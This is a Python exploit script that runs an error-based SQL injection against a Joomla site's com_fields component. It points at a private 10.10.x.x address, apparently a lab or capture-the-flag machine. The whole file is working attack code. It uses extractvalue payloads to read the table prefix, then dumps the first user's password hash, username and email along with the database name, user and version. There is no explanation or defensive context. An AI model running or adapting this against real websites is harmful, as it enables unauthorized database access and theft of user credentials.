#!/usr/bin/env python3

import requests

host = "http://10.10.164.76"

inject = host + "/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]="
payload = "1,extractvalue(0x0a,concat(0x0a,(select/**/concat(0x7e7e7e,hex(table_name),0x7e7e7e)/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/0,1)))=1"

def unhex(string):
    result = []
    for i in range(0,len(string),2):
        result.append(chr(int(string[i:i+2],16)))
    return ''.join(result)

with requests.Session() as s:
    r = s.get(inject+payload)
    data_extracted = r.text.split("~~~")[1] 
    table_name = unhex(data_extracted)
    print(f"Table names used for grabbing database table prefix: {table_name}\n")

    prefix = table_name.split('_')[0]
    total_char = 10
    start = 1
    loop_end = False
    userpass = ""

    while not loop_end:
        payload = f"1,extractvalue(0x0a,concat(0x0a,(select/**/concat(0x7e7e7e,substring(password,{start},{total_char}),0x7e7e7e)/**/from/**/{prefix}_users/**/limit/**/0,1)))=1"
        final_url = inject + payload
        r = s.get(final_url)
        data_extracted = r.text.split("~~~")[1]
        if data_extracted == "":
            loop_end = True
            break
        userpass += data_extracted
        start += 10

    username_payload = f"1,extractvalue(0x0a,concat(0x0a,(select/**/concat(0x7e7e7e,substring(username,1,20),0x7e7e7e)/**/from/**/{prefix}_users/**/limit/**/0,1)))=1"
    final_url = inject + username_payload
    r = s.get(final_url)
    username = r.text.split("~~~")[1]

    email_payload = f"1,extractvalue(0x0a,concat(0x0a,(select/**/concat(0x7e7e7e,substring(email,1,20),0x7e7e7e)/**/from/**/{prefix}_users/**/limit/**/0,1)))=1"
    final_url = inject + email_payload
    r = s.get(final_url)
    email = r.text.split("~~~")[1]

    dbuser_payload = f"1,extractvalue(0x0a,concat(0x0a,(select/**/concat(0x7e7e7e,substring(user(),1,20),0x7e7e7e))))=1"
    final_url = inject + dbuser_payload
    r = s.get(final_url)
    dbuser = r.text.split("~~~")[1]

    dbname_payload = f"1,extractvalue(0x0a,concat(0x0a,(select/**/concat(0x7e7e7e,substring(database(),1,20),0x7e7e7e))))=1"
    final_url = inject + dbname_payload
    r = s.get(final_url)
    dbname = r.text.split("~~~")[1]

    dbversion_payload = f"1,extractvalue(0x0a,concat(0x0a,(select/**/concat(0x7e7e7e,substring(version(),1,20),0x7e7e7e))))=1"
    final_url = inject + dbversion_payload
    r = s.get(final_url)
    dbversion = r.text.split("~~~")[1]     

    if username and email and userpass:
        print("\n\nInject script successfully!!\n")
        print("Database Version".ljust(35), dbversion)
        print("Database Name".ljust(35), dbname)
        print("Database User".ljust(35), dbuser)
        print("Username".ljust(35), username)
        print("Password".ljust(35), userpass)
        print("User email".ljust(35), email)
